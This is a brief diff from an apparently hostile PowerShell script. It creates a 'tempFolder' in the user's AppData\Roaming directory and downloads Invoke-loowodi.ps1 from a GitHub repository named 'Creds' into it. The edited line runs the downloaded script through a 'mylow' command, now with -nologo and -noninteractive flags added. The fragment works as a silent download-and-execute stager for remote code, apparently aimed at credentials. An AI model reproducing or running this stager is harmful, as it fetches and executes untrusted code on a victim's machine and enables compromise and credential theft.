@@ -17,4 +17,4 @@ New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "t
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IgorAlaf/Creds/main/Invoke-loowodi.ps1" -OutFile "$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"
 
 
-mylow -Command "powershell.exe -Command ""$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"""
+mylow -Command "powershell.exe -nologo -noninteractive -Command ""$env:USERPROFILE/AppData/Roaming/tempFolder/Invoke-loowodi.ps1"""
